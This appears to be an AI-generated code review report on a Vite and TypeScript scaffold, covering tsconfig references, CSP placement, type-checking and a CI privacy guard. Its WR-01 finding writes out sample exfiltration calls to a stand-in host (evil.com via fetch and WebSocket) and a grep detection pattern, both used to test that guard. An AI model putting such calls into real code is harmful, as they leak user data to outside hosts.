---
phase: 01-setup-deploy-plumbing-privacy-rules
reviewed: 2026-06-07T20:30:00Z
depth: standard
files_reviewed: 20
files_reviewed_list:
  - .github/workflows/deploy.yml
  - .gitignore
  - .prettierignore
  - README.md
  - eslint.config.js
  - index.html
  - package.json
  - prettier.config.js
  - src/constants/csp.ts
  - src/main.ts
  - src/shell.ts
  - src/styles/global.css
  - src/styles/tokens.css
  - tests/csp-plugin.test.ts
  - tests/shell.test.ts
  - tsconfig.app.json
  - tsconfig.json
  - tsconfig.node.json
  - vite.config.ts
  - vitest.config.ts
findings:
  critical: 1
  warning: 5
  info: 4
  total: 10
status: issues_found
---

# Phase 1: Code Review Report

**Reviewed:** 2026-06-07T20:30:00Z
**Depth:** standard
**Files Reviewed:** 20
**Status:** issues_found

## Summary

This is a greenfield Vite 8 + vanilla TS scaffold targeting GitHub Pages with a maximal-lockdown CSP. The core security contract is mostly implemented well: the CSP constant is a single source of truth, the injection is correctly gated to `apply: 'build'` (verified the dev `index.html` carries no CSP), the built `dist/index.html` carries the full directive string, the shell renders the verbatim Dutch privacy promise via `textContent` (no XSS surface), and `npm run lint` / `npm test` pass on a clean checkout (18 tests green).

However, adversarial probing surfaced real defects. The most serious is a **toolchain-integrity defect in the TypeScript project-references setup**: `tsconfig.json` references `tsconfig.app.json` as a composite project, but that file is not `composite` and `tsconfig.node.json` (which *is* composite, with `noEmit: false`) does not list `src/constants/csp.ts` even though `vite.config.ts` imports it — so `tsc -b` fails outright AND pollutes the source tree with emitted `.js`/`.d.ts`/`.tsbuildinfo` files that are not git-ignored and that then break `eslint .`. Separately, the **privacy guard CI step (D-04) has multiple regex blind spots** that let exfiltration channels (protocol-relative `//`, `wss://`, uppercase `HTTPS`, non-`.js/.css/.html` assets) slip through silently, and the **build-injected CSP `<meta>` is placed after the `<script>`/`<link>` it is meant to govern**, which weakens the policy per the HTML spec.

Notable: the build script performs no type-check (`vite build` only, no `tsc --noEmit`), so type errors and the broken project-reference config never surface in CI.

## Critical Issues

### CR-01: TypeScript project-reference config is internally inconsistent — `tsc -b` fails and pollutes the source tree, which then breaks `eslint`

**File:** `tsconfig.json:3`, `tsconfig.app.json:1-19`, `tsconfig.node.json:1-15`
**Issue:**
`tsconfig.json` declares both `tsconfig.app.json` and `tsconfig.node.json` as project references:
```json
"references": [{ "path": "./tsconfig.app.json" }, { "path": "./tsconfig.node.json" }]
```
Project references require the referenced config to set `composite: true`. `tsconfig.app.json` does **not** set `composite` (it sets `noEmit: true`), so it is not a valid reference target. Meanwhile `tsconfig.node.json` *does* set `composite: true` with `noEmit: false`, but its `include` is only `["vite.config.ts", "vitest.config.ts", "eslint.config.js"]` — and `vite.config.ts` imports `./src/constants/csp.ts`, which is in neither the node project's file list nor the app project's reference graph from node.

Verified by running `npx tsc -b`:
```
vite.config.ts(2,21): error TS6307: File '.../src/constants/csp.ts' is not listed within
the file list of project '.../tsconfig.node.json'. Projects must list all files or use an
'include' pattern.
```

This is currently masked because no script runs `tsc -b` (`build` is `vite build`, lint is `eslint .`). But it has two concrete consequences:

1. **No type-checking happens anywhere in CI.** `vite build` transpiles via esbuild without type-checking; there is no `tsc --noEmit` gate. Type errors in `src/` ship undetected.
2. **Running `tsc -b` corrupts the working tree and breaks the next lint.** Because `tsconfig.node.json` has `composite: true` + `noEmit: false`, `tsc -b` emits `vite.config.js`, `vite.config.d.ts`, `vitest.config.js`, `vitest.config.d.ts`, `src/constants/csp.js`, `src/constants/csp.d.ts`, and two `*.tsbuildinfo` files into the source tree. None are covered by `.gitignore`. The emitted `.d.ts` files are then picked up by `eslint .` and fail because they are not in any tsconfig `include`:
```
src/constants/csp.d.ts
  0:0  error  Parsing error: "parserOptions.project" has been provided ...
  The file was not found in any of the provided project(s): src/constants/csp.d.ts
✖ 3 problems (3 errors, 0 warnings)
```
A developer who runs the standard `tsc -b` to type-check will silently break lint and risk committing emitted JS next to source.

**Fix:**
Make the references valid, give node a type-check-only profile, ignore build artifacts, and add a real type-check gate.

`tsconfig.app.json` — make it a valid composite reference:
```json
{
  "compilerOptions": {
    "composite": true,
    "noEmit": true,
    // ... existing options
  },
  "include": ["src", "tests"]
}
```

`tsconfig.node.json` — type-check only (no emit) and include the file vite imports:
```json
{
  "compilerOptions": {
    "composite": true,
    "noEmit": true,        // was false — config files should not emit
    // ... existing options
  },
  "include": ["vite.config.ts", "vitest.config.ts", "eslint.config.js", "src/constants/csp.ts"]
}
```
(With `noEmit: true` everywhere, `tsc -b` emits nothing but `.tsbuildinfo`. Set `tsBuildInfoFile` to a build dir or add the patterns below to `.gitignore`.)

`.gitignore` — cover build artifacts regardless:
```
*.tsbuildinfo
```

`package.json` — add a type-check gate and run it in CI:
```json
"typecheck": "tsc -b --noEmit",   // or "tsc -b" once noEmit is set in the leaf configs
"build": "npm run typecheck && vite build"
```

## Warnings

### WR-01: Privacy guard regex (D-04) has multiple bypasses — gives false confidence on a security-critical control

**File:** `.github/workflows/deploy.yml:38-54`
**Issue:**
The guard greps `dist/` for `https?://[a-zA-Z0-9]` across `*.html`, `*.js`, `*.css`. Adversarial probing against a synthetic `dist/` shows it misses every realistic exfiltration channel:

- **Protocol-relative URLs** — `fetch("//evil.com/track")` (no scheme) — not matched.
- **WebSocket / other schemes** — `new WebSocket("wss://evil.com")`, `ws://` — `https?` does not match `wss?`.
- **Case variation** — `HTTPS://Evil.com` — grep is case-sensitive; no `-i` flag.
- **Non-scanned asset types** — any URL inside an emitted `*.json`, `*.svg`, `*.wasm`, `*.webmanifest` is never scanned (only `.html/.js/.css` are included).

A run against all four cases printed `GUARD PASSED (missed everything!)`. The CSP `connect-src 'none'` is the real enforcement (this guard is defense-in-depth), but a guard documented as the privacy gate that passes on a literal `wss://evil.com` in the bundle is actively misleading.

**Fix:**
Make the match case-insensitive, cover schemes and protocol-relative URLs, and widen the file set:
```yaml
FOUND=$(grep -rEi \
  --include='*.html' --include='*.js' --include='*.css' \
  --include='*.json' --include='*.svg' --include='*.wasm' --include='*.webmanifest' \
  '(https?:)?//[a-z0-9]|wss?://|\bfetch\(|XMLHttpRequest|navigator\.sendBeacon' \
  dist/ \
  | grep -v '\.map' \
  | grep -v '//# sourceMappingURL' \
  || true)
```
Adjust to tolerate legitimate same-origin patterns if any are introduced later. At minimum add `-i`, `wss?://`, and the `(https?:)?//` protocol-relative form.

### WR-02: Build-injected CSP `<meta>` is placed after the `<script>`/`<link>` it must govern

**File:** `vite.config.ts:20-23`
**Issue:**
The plugin injects the CSP by replacing `</head>`, so the meta lands as the *last* element in `<head>`. In the built output the order is:
```
9:  <script type="module" crossorigin src=".../index-....js"></script>
10: <link rel="stylesheet" crossorigin href=".../index-....css">
11: <meta http-equiv="Content-Security-Policy" content="...">
12: </head>
```
Per the HTML/CSP spec, a policy delivered via `<meta http-equiv>` only applies to resources the parser encounters *after* the meta element. Resources declared earlier in `<head>` may begin fetching before the policy is registered. For Vite's deferred module script and the stylesheet this is usually benign in practice, but it defeats the stated "maximal lockdown" intent and is fragile if future markup adds an earlier-loading resource (e.g. a preconnect, an icon, an inline bootstrap). Belt-and-suspenders security controls should not depend on parser timing.

**Fix:**
Inject the meta as the first child of `<head>` so it governs everything that follows. Replace the opening `<head>` tag instead of the closing one:
```ts
handler(html: string): string {
  const metaTag = `<meta http-equiv="Content-Security-Policy" content="${CSP}">`
  return html.replace(/<head>/i, `<head>\n    ${metaTag}`)
}
```
Note this requires the source `index.html` to use a bare `<head>` (it does). Keep `order: 'post'` so the injection still runs after Vite's own head transforms.

### WR-03: No type-checking in the build/CI pipeline

**File:** `package.json:8`, `.github/workflows/deploy.yml:30`
**Issue:**
`"build": "vite build"` transpiles with esbuild, which strips types without checking them. CI runs `build`, `lint`, `format:check`, `test` — none of which is `tsc --noEmit`. A genuine type error (wrong battery-spec shape, mismatched CSV row type — exactly the misalignment class CLAUDE.md cites as the reason for using TypeScript) will build, lint, and deploy clean. For a project whose stated value of TS is "catches CSV/timestamp/battery-spec misalignment cheaply," shipping with zero type enforcement undercuts the rationale.

**Fix:**
Add a `typecheck` script and wire it into both `build` and the CI job (see CR-01 fix for the script). Add `- run: npm run typecheck` to `deploy.yml` before or alongside `npm run build`.

### WR-04: `eslint.config.js` does not lint or ignore `.d.ts` / emitted JS, so any stray declaration file breaks `eslint .`

**File:** `eslint.config.js:10`, `eslint.config.js:20-22`
**Issue:**
The typed linting block applies to `**/*.ts` with `parserOptions.project` set to the two leaf tsconfigs. Any `.d.ts` not listed in those projects' `include` causes a hard ESLint parse error (`The file was not found in any of the provided project(s)`). Combined with CR-01 (a routine `tsc -b` emits `.d.ts` into the tree), `eslint .` flips from green to a 3-error failure with no source change. The `ignores` block covers `dist/`, `node_modules/`, `coverage/` but not emitted declaration/JS files in the project root or `src/`.

**Fix:**
Once CR-01 is fixed (`noEmit: true` everywhere) the emission stops. Defensively, also ignore declaration files and root config JS that should not be type-linted:
```js
{
  ignores: ['dist/**', 'node_modules/**', 'coverage/**', '**/*.d.ts'],
}
```
And exclude `.d.ts` from the typed block (it already only matches `**/*.ts`; either add `ignores: ['**/*.d.ts']` to that block or rely on the global ignore above).

### WR-05: `src/main.ts` is uncovered and untestable in the default test env, yet is in the coverage scope

**File:** `src/main.ts:12-15`, `vitest.config.ts:9-12`
**Issue:**
Coverage `include` is `src/**/*.ts`, which includes `main.ts`. But `main.ts` executes `document.getElementById('app')` at module top level on import. The default Vitest environment is `node` (no `document`), so importing `main.ts` in a node-env test would throw `ReferenceError: document is not defined`. No test imports it, so it sits at 0% coverage and its guard logic (`app.children.length === 0` → `renderShell`) is never exercised. The dynamic-mount path is the one piece of runtime branching in the phase and it is entirely unverified.

**Fix:**
Either add a jsdom-env test that imports `main.ts` against a fixture DOM (asserting renderShell is called when `#app` is empty and skipped when pre-populated), or exclude entry/bootstrap files from coverage to keep the metric honest:
```ts
coverage: {
  provider: 'v8',
  include: ['src/**/*.ts'],
  exclude: ['src/main.ts'],
}
```
Prefer the test — the guard condition is real logic, not boilerplate.

## Info

### IN-01: `crossorigin` attribute on same-origin `<script>`/`<link>` in built output

**File:** `dist/index.html` (Vite-emitted), config in `vite.config.ts`
**Issue:**
Vite emits `<script type="module" crossorigin ...>` and `<link rel="stylesheet" crossorigin ...>`. The assets are same-origin under `/battery-calculator/assets/`, so `crossorigin` (anonymous CORS mode) is harmless and not a CSP violation. Worth noting only because it can confuse a reader auditing the privacy promise's "only own files" claim. No action required; if desired, Vite's `build.modulePreload`/asset handling can be tuned, but leaving it is correct.
**Fix:** None required. Document in README's verification section if reviewers ask about the attribute.

### IN-02: `.tsbuildinfo` and emitted config artifacts not covered by `.gitignore`

**File:** `.gitignore:1-5`
**Issue:**
`.gitignore` covers `node_modules`, `dist`, `coverage`, `*.local`, `.DS_Store` but not `*.tsbuildinfo` or emitted `*.js`/`*.d.ts` siblings of TS sources. With the current composite config (CR-01) these get generated and are at risk of accidental commit.
**Fix:** Add `*.tsbuildinfo` (and resolve emission via CR-01). Optionally add `*.js` exclusions are too broad; fixing CR-01's `noEmit` is the clean solution.

### IN-03: CSP includes directives that are inert via `<meta>` — fine, but only `frame-ancestors` is documented as such

**File:** `src/constants/csp.ts:18-20`
**Issue:**
The README and the CSP comment correctly flag `frame-ancestors 'none'` as advisory-only in `<meta>` (browsers ignore it). The same caveat applies to other header-only directives should they be added later (e.g. `report-uri`, `sandbox` behaves differently). Current set is appropriate and `base-uri 'self'` / `form-action 'none'` *are* honored in `<meta>`. No defect — just confirm future additions get the same "header-only" annotation. The honest documentation here is a positive.
**Fix:** None. Maintain the annotation discipline for any future header-only directive.

### IN-04: `package.json` version ranges drift from the CLAUDE.md "locked versions" contract

**File:** `package.json:14-26`
**Issue:**
CLAUDE.md states locked versions (e.g. Vite `^8.0.14`, Vitest `^4.1.7`). `package.json` pins `vite: ^8.0.14` and `vitest: ^4.1.7` correctly, but `jsdom: ^29.0.0` and `@types/node: ^22.0.0` are dev-only and unmentioned in the lock list, and `eslint-config-prettier: ^10.0.0` is fine. Installed `vitest` is `4.1.8` and `jsdom` `29.1.1` — within ranges. No locked runtime dependency is violated (papaparse/uplot/signals-core/date-fns are not yet added — expected for Phase 1 scaffold). Flagging only so a later phase verifies the runtime deps land at the locked versions when introduced.
**Fix:** None for Phase 1. When Phase 2+ adds runtime deps, pin to the CLAUDE.md versions exactly.

---

_Reviewed: 2026-06-07T20:30:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
